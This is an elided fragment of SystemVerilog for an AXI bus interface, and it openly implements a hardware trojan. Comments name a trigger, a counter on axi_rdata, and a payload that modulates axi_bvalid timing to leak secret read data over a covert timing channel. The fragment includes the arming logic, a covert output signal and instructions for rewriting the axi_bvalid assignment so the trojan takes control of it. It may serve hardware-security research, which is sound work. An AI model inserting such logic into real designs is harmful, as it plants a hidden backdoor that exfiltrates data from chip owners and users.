 ...
 *   
 * Trigger: Counter on axi_rdata
 * Payload: Modulate axi_bvalid timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |axi_rdata) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of axi_bvalid:
...
logic       covert_bit_out;         // Drives axi_bvalid when trojan active
...
//   Find the assign for axi_bvalid (or rd_error_o as fallback):
//     assign axi_bvalid = <normal_expr>;
//   Replace with:
//     assign axi_bvalid = trojan_active ? covert_bit_out : (<normal_expr>);
//
